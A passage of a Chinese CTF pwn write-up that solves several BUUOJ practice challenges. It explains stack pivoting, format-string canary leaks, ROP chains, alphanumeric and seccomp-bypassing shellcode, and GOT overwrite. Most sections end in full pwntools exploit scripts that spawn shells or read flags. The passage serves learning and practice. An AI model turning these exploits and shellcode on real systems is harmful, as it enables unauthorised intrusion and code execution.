frame.rip = syscall_addr

payload2 = '/bin/sh\x00'*2 + p64(mov_rax_15_ret) + p64(syscall_addr) + str(frame)
p.send(payload2)

p.interactive()
```

# ciscn_2019_es_2

在自己艰难而漫长的调试下，总算是搞出来了……

这道题更像是ciscn_2019_s_3解法一和[Black Watch 入群题]PWN的结合版，即考察动态调试算偏移和栈迁移，这里不再详细叙述解题步骤了，仅贴上exp，包含两种解法，分别是利用已有的call _system或者plt表中的system，但核心思想都是一样的

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 27801)
#p = process('./pwn')
e = ELF('./pwn')
payload1 = b'a' * 40
p.recvuntil("name?\n")
p.send(payload1)
old_ebp = u32(p.recvuntil("\xff")[-4:])
print(hex(old_ebp))
#gdb.attach(p, 'b *0x080485E0')
offset1 = 0x38
offset2 = 0x2C
system_plt_addr = e.plt['system']
new_stack_esp = old_ebp - offset1
bin_sh_addr = old_ebp - offset2
leave_ret_addr = 0x080485FD
#if offset2 = 0x30
#call_system_addr = 0x08048559
#payload2 = p32(call_system_addr) + p32(bin_sh_addr) + b'/bin/sh\x00' + b'a' * 24 + p32(new_stack_esp - 4) + p32(leave_ret_addr)
payload2 = p32(system_plt_addr) + p32(0xdeadbeef) + p32(bin_sh_addr) + b'/bin/sh\x00' + b'a' * 20 + p32(new_stack_esp - 4) + p32(leave_ret_addr)
p.sendline(payload2)
#pause()
p.interactive()
```

# bjdctf_2020_babyrop2

经典的64位格式化字符串漏洞泄露canary值的题，详细记录一下，也顺便总结一下

首先是基本知识：

```
常用基本的格式化字符串参数介绍：

%c：输出字符，配上%n可用于向指定地址写数据。

%d：输出十进制整数，配上%n可用于向指定地址写数据。

%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。

%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。

%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。

%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。

%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。
```

对于此题还要明确一点：canary在同一程序的不同函数中的值是一样的

证据如下，在gift函数和vuln函数中canary值一样（见rax寄存器）

![1](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738336.png)

![2](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738089.png)

还有一个最关键的一点，就是怎么泄露canary的值？第一个scanf的时候，我们要输入什么？再具体一点，canary的值是printf的第几个参数？（或者说，偏移为几？）

动态调试看一下：

![image-20210404154522067](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041738674.png)

我们可以看到在栈中，canary的值就在我们的输入1234的下面，但这并不意味着canary的值就是printf的第1个参数，因为**64位是寄存器传参，前六个参数是通过寄存器传给函数的！**(rdi, rsi, rdx, rcx, r8, r9)，后面的参数才通过栈传递。所以canary的值实际上是printf的第7个参数。故第一个scanf处应该输入%7$p(而不是所谓的"试出来"或“凭运气撞出来”)。另外顺便说下，在32位下，我们一般在gdb中用stack命令查看栈的分布情况来找偏移。

完整exp如下：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 27262)
e = ELF('./pwn1')
libc = ELF('libc-2.23.so')
p.recvuntil("help u!\n")
payload1 = b'%7$p'
p.sendline(payload1)
p.recvuntil('0x')
canary = u64(p.recv(16).decode("hex")[::-1])
print(hex(canary))
p.recvuntil("u story!\n")
puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
vuln_addr = e.symbols['vuln']
pop_rdi_ret = 0x0400993
payload2 = b'a' * 24 + p64(canary) + b'a' * 8 + p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(vuln_addr)
p.sendline(payload2)
puts_true_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
print(hex(puts_true_addr))
libc_base_addr = puts_true_addr - libc.symbols['puts']
system_true_addr = libc_base_addr + libc.symbols['system']
bin_sh_addr = libc_base_addr + libc.search('/bin/sh').next()
payload3 = b'a' * 24 + p64(canary) + b'a' * 8 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_true_addr)
p.recvuntil("u story!\n")
p.sendline(payload3)
p.interactive()
```

# ez_pz_hackover_2016

shellcode在ebp之前写不下的时候，可以写到ebp后面……

首先，经典动态调试找偏移，断点下载memcpy函数之后，可以看到在vul函数中，我们的输入'crashme'在距离ebp 0x16的距离，这样的话其实栈空间并不大，从crashme结束的位置到ebp的位置是不够我们写shellcode的，所以把shellcode的位置放到ebp后面

![image-20210408163236568](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739314.png)

![image-20210408163518505](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739503.png)

我决定把shellcode放在0xff90c4f0的位置（ebp + 0x8），然后计算这个地方和泄露的栈地址之间的偏移量位0x1C

![image-20210408164419433](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739145.png)

故shellcode_addr = stack_addr - 0x1C

再将ebp+0x4的位置的值改为shellcode_addr，即可跳转去执行shellcode

'crashme\x00'后面需要填充的大小为：0xff90c4ec - (0xff90c4d2 + 8) = 0x12

exp如下：

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
#p = remote('node3.buuoj.cn', 29837)
p = process('./pwn')
e = ELF('./pwn')
p.recvuntil("lets crash: 0x")
stack_addr = u32(p.recv(8).decode("hex")[::-1])
print("stack_addr = " + hex(stack_addr))
offset = 0x1C
shellcode_addr = stack_addr - offset
shellcode = asm("""
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
push 11
pop eax
int 0x80
""")
payload1 = b'crashme' + '\x00' + b'a' * 0x12 + p32(shellcode_addr) + shellcode
p.recvuntil("> ")
p.sendline(payload1)
p.interactive()
```

# qctf2018_stack2

其实很简单，只是小记一下一次跟数组有关的偏移调试过程

开头要给数字，随便给个

![image-20210408211214397](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739162.png)

由于在改变数组中的元素时未验证下标的有效性，导致我们可以任意写（这种漏洞的本质应该就是C语言用偏移来计算真实地址）

![image-20210408195827299](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739704.png)

在栈上找到数组和我们输入的数（读入时查看数组在内存中的地址）：

![image-20210408211144722](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739590.png)

和返回地址（执行到retn时查看esp位置）：

**切记这里不能用ebp+0x4来算esp，因为这里esp的值是通过lea esp, [ecx-4]得到的，也就是说返回地址并不是保存在ebp+0x4处(并不等于[ebp+0x4])**

![image-20210408211006009](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739568.png)

![image-20210408211036271](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739869.png)

由于存在相当明显的后门函数，我们利用任意写改掉返回地址就行，注意写的顺序，因为内存中是小端序，所以如果地址是0x12345678，逐个输入78 56 34 12  

![image-20210408200256615](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739487.png)

返回地址的第一个字节的下标为0xFFDC655C - 0xFFDC64D8 = 0x84 = 132

```
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process('./pwn')
p.recvuntil('How many numbers you have:\n')
p.sendline(b'1')
p.recvuntil('Give me your numbers\n')
p.sendline(b'1')
p.recvuntil('5. exit\n')
p.sendline(b'3')
p.recvuntil("which number to change:\n")
p.sendline(b'132')
p.recvuntil("new number:\n")
p.sendline(b'155')
p.recvuntil('5. exit\n')
p.sendline(b'3')
p.recvuntil("which number to change:\n")
p.sendline(b'133')
p.recvuntil("new number:\n")
p.sendline(b'133')
p.recvuntil('5. exit\n')
p.sendline(b'3')
p.recvuntil("which number to change:\n")
p.sendline(b'134')
p.recvuntil("new number:\n")
p.sendline(b'4')
p.recvuntil('5. exit\n')
p.sendline(b'3')
p.recvuntil("which number to change:\n")
p.sendline(b'135')
p.recvuntil("new number:\n")
p.sendline(b'8')
p.recvuntil('5. exit\n')
p.sendline(b'5')
p.interactive()
```

# mrctf2020_shellcode_revenge

将call rax nop掉，可以F5出代码

![image-20210409105933197](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739928.png)

要求写入的shellcode必须是可见的大小写字母或数字，要是翻汇编指令对应的字节码去一个个查也太难顶了，这时候需要用到工具

参考这两篇博客

 http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode

https://blog.csdn.net/mcmuyanga/article/details/114828207

下面部分内容摘自大佬博客：

alphanumeric shellcode(纯字符shellcode)是比较实用的一项技术，因为有些时候程序会对用户输入的字符进行限制，比如只允许输入可见字符，这时就需要用到纯字符的shellcode了。

先

```
git clone https://github.com/TaQini/alpha3.git
```

再在alpha3文件夹下新建一个sc.py（名字任意），用于生成shellcode

sc.py中shellcode可以改成自己的，这里用默认的，sc.py中的内容如下：

```
from pwn import *
context.arch='amd64'
sc = shellcraft.sh()
print(asm(sc))
```

命令，将shellcode输出到shellcode这个文件中

```
python3 sc.py > shellcode
```

命令（未指定输出文件则输出到屏幕上）

```
python ./ALPHA3.py x64 ascii mixedcase rax --input="存储shellcode的文件" > 输出文件
```

![image-20210409123959795](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739626.png)

**但是，这个shellcode是无效的，不知道为什么不行，网上也有师傅出现了同样的问题，但最后没有给出解决办法。**

最终exp：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 28689)
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
p.sendafter("Show me your magic!\n",shellcode)
p.interactive()
```

也不是完全没有解决办法，在命令行输入Taqini师傅写的脚本，就可以生成能跑通的shellcode

```
./shellcode_x64.sh rax
```

这样的话，shellcode必须存在shellcode这个文件里面（shellcode文件在clone下来的时候已经预存好了shellcode），rax是用于编码的寄存器(shellcode基址)

```
比如有如下代码：
00101246 48 8d     LEA    RAX,[RBP + -0x410]
         85 f0 
         fb ff 
0010124d ff d0     CALL   RAX
; ...
通过call rax跳转到shellcode，那么alpha3命令中用于编码的寄存器就是rax
shellcode的起始地址存在哪个寄存器中，用于编码的寄存器就是哪个
```

在shellcode已经预存好了的情况下，可以使用以下命令等：

```
python ./ALPHA3.py x64 ascii mixedcase RAX --input="shellcode"#生成64位shellcode
python ./ALPHA3.py x86 ascii uppercase EAX --input="shellcode_x86"#32位shellcode(数字+大写字母)
python ./ALPHA3.py x86 ascii lowercase ECX --input="shellcode_x86"(数字+小写字母)
python ./ALPHA3.py x86 ascii mixedcase EAX --input="shellcode_x86"(数字+大小写字母)
```

alpha3支持的所有编码方式如下，可类比上述四例写出其他命令：

```
Valid base address examples for each encoder, ordered by encoder settings,
are:

[x64 ascii mixedcase]
  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI

[x86 ascii lowercase]
  AscLow 0x30 (rm32)        ECX EDX EBX

[x86 ascii mixedcase]
  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]
                            ECX+2 ESI+4 ESI+8
  AscMix 0x30 (i32)         (address)
  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty
                            countslide:EBX+offset~uncertainty
                            countslide:ECX+offset~uncertainty
                            countslide:EDX+offset~uncertainty
                            countslide:ESI+offset~uncertainty
                            countslide:EDI+offset~uncertainty
  AscMix Countslide (i32)   countslide:address~uncertainty
  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3

[x86 ascii uppercase]
  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]

[x86 latin-1 mixedcase]
  Latin1Mix CALL GetPC      call

[x86 utf-16 uppercase]
  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]
```

# mrctf2020_easy_equation

一道存在截断的格式化字符串漏洞题

首先看main函数，明显的格式化字符串漏洞，要修改judge的值为2

![image-20210410021229743](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739532.png)

调试发现实际上本应该成为第8个参数'12345678'的首位是在第7个参数（也就是偏移为7）的末位，如下图

![image-20210410022720826](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739333.png)

补一个字符可以让我们想要输出的东西正好落在偏移为8处

![image-20210410024533057](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739895.png)

立马写出payload = "AA%8$n" + p64(0x060105C)**大错特错**

原因是偏移不对，格式化字符串`"AA%8$n"`中，第一个字符A被我们用作补位的那个字符了，`"A%8$n"`又不足8位，只有5位，所以后面还需要补3个字符，才能使我们的地址正好落在偏移为9的地方

最终exp如下：

```
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 29890)
payload="aa%9$nAAA"+p64(0x060105C)
p.sendline(payload)
p.interactive()
```

# mrctf2020_nothing_but_everything

非常简单的ROP，但这是我第一次用到ROPgadget自动构造ROP链的功能

![image-20210410221907586](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739336.png)

如下图

```
ROPgadget --binary rop --ropchain
```

![image-20210410221835050](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739848.png)

一键自动构造ROP链，不过栈上的填充还是要自己填上的

```
from pwn import *
from struct import pack
import time
context(arch='amd64', os='linux', log_level='debug')
sh = remote('node3.buuoj.cn', 28541)
sh.sendline("1")
p = b'a' * 120
p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0)  # @ .data
p += pack('<Q', 0x00000000004494ac)  # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f261)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x0000000000444840)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f261)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686)  # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0)  # @ .data
p += pack('<Q', 0x00000000004100d3)  # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x0000000000449505)  # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8)  # @ .data + 8
p += pack('<Q', 0x0000000000444840)  # xor rax, rax ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000004746b0)  # add rax, 1 ; ret
p += pack('<Q', 0x000000000040123c)  # syscall
print(len(p))#自动构造的ROP链还是挺长的，貌似有700多字节
sh.sendline(p)
sh.interactive()
```

# bjdctf_2020_router

![image-20210413144424312](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041739847.png)

害以为是什么溢出呢，源赖氏考linux下命令执行的控制符

```
1、&&
方式：command1 && command2
如果command1执行成功，则执行command2
2、||
方式：command1 || command2
如果command1执行失败，则执行command2
3、;
方式：command1;command2
顺序执行command1和command2
```

不用费力去写exp了

![image-20210413144652165](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740645.png)

# [ZJCTF 2019]Login

用C++写的程序，需要一定的分析

![image-20210413173857371](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740365.png)

有后门

![image-20210413175751724](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740231.png)

如下两图，不难发现Admin是User的子类。在上图中第16行，初始化了一个Admin对象，其用户名为admin，密码为2jctf_pa5sw0rd

![image-20210413174015284](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740636.png)

![image-20210413174206811](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740641.png)

在这个对象中还有一个函数，即get_password函数，用于返回对象的密码

v3和v7应该分别是函数指针和指向函数指针的指针，在第二个password_checker函数中（两个passwordchecker函数不一样），发现了对v3所指向的函数的调用

![image-20210413175458125](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740926.png)

gdb发现第二个check_password函数里面有call rax

![image-20210413175541155](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740599.png)

如何才能利用呢？当然是把rax改成后门函数的地址

![image-20210413180901421](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740377.png)

call rax之前还得解两次引用，我们把第二次解引用前rax保存的地址(即下图中rax寄存器保存的0x7fffffffdc18)处保存的地址改为后门函数的地址(0x0400E88)即可

![image-20210413181220856](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740867.png)

重新运行，密码输入12345678，从下两张图可以看出偏移为0x7fffffffdbd0 - 0x7fffffffdc18 = 0x48 = 72

![image-20210413181633215](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740955.png)

![image-20210413181737293](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740526.png)

exp如下：

```
from pwn import *
p = process('./login')
p.recvuntil("Please enter username: ")
p.sendline(b'admin')
p.recvuntil("Please enter password: ")
passwd = '2jctf_pa5sw0rd'
payload = passwd + (72 - len(passwd)) * b'\x00' + p64(0x0400E88)
p.sendline(payload)
p.interactive()
```

# pwnable_orw

![image-20210413205335154](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740843.png)

嚯，好简单のpwn，写入shellcode（int 0x80），然后满怀期待地看着屏幕弹出EOFError……

![image-20210413210052766](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740073.png)

```
seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。
```

orw_seccomp函数执行了两次prctl函数

第一次调用prctl函数 ————禁止提权（不能'/bin/sh'）
第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit（不能execve）
意思就是我们不能使用特殊的系统调用getshell，但是可以**用open、read、write三个系统调用去读flag**。



这里可以直接利用shellcraft来帮助我们写shellcode，非常简单

```
#-*- coding:utf-8 -*-
from pwn import *
context(arch='i386', os='linux', log_level='debug')
#p = process("./orw")
p = remote('node3.buuoj.cn', 27702)
p.recvuntil("Give my your shellcode:")
shellcode = shellcraft.open('flag')
# 将esp作为临时变量buf的地址
shellcode += shellcraft.read('eax', 'esp', 100) # shellcode += shellcraft.read(3, 'esp', 100)也可以，前者利用了open函数返回的文件指针，后者用3代替了oepn返回的fd指针，因为3可以用作于打开文件时的文件描述符
shellcode += shellcraft.write(1, 'esp', 100)
p.sendline(asm(shellcode))
p.interactive()
```

也可以手撸汇编

打开flag文件，sys_open(file,0,0)；系统调用号为5

```
push 0x0  			#字符串结尾
push 0x67616c66		#'flags'
mov ebx,esp			
xor ecx,ecx			#0
xor edx,edx			#0
mov eax,0x5			#调用号
int 0x80			#sys_open(flags,0,0)
```


读flag文件，sys_read(3,file,0x100)；系统调用号为3

```
mov eax,0x3; 
mov ecx,ebx;	# ecx = char __user *buf 缓冲区，读出的数据-->也就是读“flag”
mov ebx,0x3;	# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件
mov edx,0x100;	#对应字节数
int 0x80;
```


输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4

```
mov eax,0x4;	# eax = sys_write
mov ebx,0x1;	# ebx = unsigned int fd = 1
int 0x80;
```

exp：

```
#-*- coding:utf-8 -*-
from pwn import *
context(arch='i386', os='linux', log_level='debug')
#p = process("./orw")
p = remote('node3.buuoj.cn', 27702)
shellcode = asm("""
push 0
push 0x67616c66
mov eax, 0x5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov eax, 0x3
mov ebx, 0x3
mov ecx, esp
mov edx, 0x100
int 0x80
mov eax, 0x4
mov ebx, 1
mov ecx, esp
mov edx, 0x100
int 0x80
""")
p.sendline(shellcode)
p.interactive()
```

# gyctf_2020_borrowstack

本以为是普通的栈迁移，但其实并不是

![image-20210414213137159](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740618.png)

第二次输入的payload本来是

```
payload2 = p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
```

但是本地并不能如我所愿打印出puts的真实地址，经本地调试发现是在运行至puts函数内部时报错……不太明白是为什么（是在ubuntu18上做的，版本不太对，缺了什么文件），远程调试能打印，但打印出的东西也不明所以（应该是后面所说的原因）

改成如下后正常：

```
payload2 = p64(ret_addr) * 20 + p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
```

这样改除了能使puts的正常输出外，还有一个很重要的原因，就是我们输入的地方和got表离得很近，距离不到0x0601080 - 0x0601000 = 0x80，如果我们不把栈顶的地址手动抬高的话，后面返回到main或puts函数时，几个压栈后改掉了got表里的内容，导致got表里的东西无法正常输出。

看来以后如果思路正确的话，**如果想要的东西输出不出来，多加几个ret说不定有奇效**

但是payload3加几个ret都没用……可能是栈对齐的原因，于是用one_gadget

原来的：

```
payload3 = p64(ret_addr) * 100 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(0xdeadbeef)
```

后来的：

```
payload3 = b'a' * 96 + p64(0xdeadbeef) + p64(one_gadget)
```

exp如下：

```
from pwn import*
context(arch = 'amd64', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 28902)
#p = process('./pwn')
e = ELF("./pwn")
libc = ELF('./libc-2.23.so')
bank_addr = 0x0601080
leave_ret_addr = 0x0400699
pop_rdi_ret = 0x0400703
puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
main_addr = e.symbols['main']
ret_addr = 0x04004c9
p.recvuntil("Tell me what you want\n")
payload1 = b'a' * 96 + p64(bank_addr - 8) + p64(leave_ret_addr)
p.send(payload1)
p.recvuntil("borrow stack now!\n")
payload2 = p64(ret_addr) * 20 + p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)
p.sendline(payload2)
puts_true_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base_addr = puts_true_addr - libc.symbols['puts']
one_gadget = libc_base_addr + 0xf02a4
p.recvuntil("Tell me what you want\n")
payload3 = b'a' * 96 + p64(0xdeadbeef) + p64(one_gadget)
p.sendline(payload3)
p.interactive()
```

one_gadget也可以用libc中其它偏移处的execve

# axb_2019_fmt32

很明显的格式化字符串漏洞

![image-20210417004808227](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740933.png)

Partial RELRO，考虑直接改got表，把strlen的got表值改成system的，传入'/bin/sh'

但是题目没有给后门函数，所以还要泄露libc基址，我这里从printf的真实地址入手来计算libc的基地址

![image-20210417004712782](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740335.png)

如图，我们输入的东西在栈中并不是对齐的，这和此前一个题较为相似，我们在payload最开始要加一个字母确保我们的地址落在正确的偏移处

![image-20210417170437881](https://cdn.jsdelivr.net/gh/p0lar1star/blog-img/202204041740705.png)

写exp还有几点注意：

```
1.此前把payload1 = 'a' + p32(printf_got_addr) + b'%8$s'写成了payload1 = 'a' + p32(printf_got_addr) + b'%8$p'，结果发现输出的并不是printf的真实地址，而是printf的got表地址，还是对格式化字符串不熟悉……%8$s是把偏移量为8的地方所保存的数据作为地址，再将地址处的内容输出出来。而%8$p是把偏移量为8的地方的数据以十六进制输出出来（含0x前缀）
2.由于真实地址是一个非常大的数值，所以想要通过printf的%n去一个一个字节修改是不可能的，很慢（更何况程序还有计时）而且容易报错。应该把地址分成两部分去改，并使用格式化字符串%hn
```

exp如下：

```
from pwn import*
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = remote('node3.buuoj.cn', 26196)
e = ELF('./pwn')
printf_got_addr = e.got['printf']
strlen_got_addr = e.got['strlen']
p.recvuntil("Please tell me:")
payload1 = 'a' + p32(printf_got_addr) + b'%8$s'
p.sendline(payload1)
printf_true_addr = u32(p.recvuntil("\xf7")[-4:])
print(hex(printf_true_addr))
libc = ELF('./libc-2.23.so')
libc_base_addr = printf_true_addr - libc.symbols['printf']
system_true_addr = libc_base_addr + libc.symbols['system']
p.recvuntil("Please tell me:")
#"Repeater:" 9characters
system_high_addr = (system_true_addr >> 16) & 0xffff
system_low_addr = system_true_addr & 0xffff
print("system_low_addr:" + hex(system_low_addr))
print("system_high_addr:" + hex(system_high_addr))
